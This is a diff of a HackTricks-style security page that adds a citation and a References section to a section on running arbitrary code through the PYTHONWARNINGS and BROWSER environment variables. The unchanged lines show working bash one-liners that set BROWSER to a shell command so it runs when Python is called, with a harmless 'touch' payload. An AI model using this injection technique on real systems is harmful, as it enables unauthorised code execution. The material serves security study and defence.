@@ -4,7 +4,7 @@
 
 ## Via `PYTHONWARNINGS` and `BROWSER` env variables
 
-It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:
+It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:<sup>[[1]](#references)</sup>
 
 ```bash
 # Generate example python script
@@ -17,7 +17,8 @@ PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktri
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
 
+## References
+
+- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
+
 {{#include ../../../banners/hacktricks-training.md}}
-
-
-
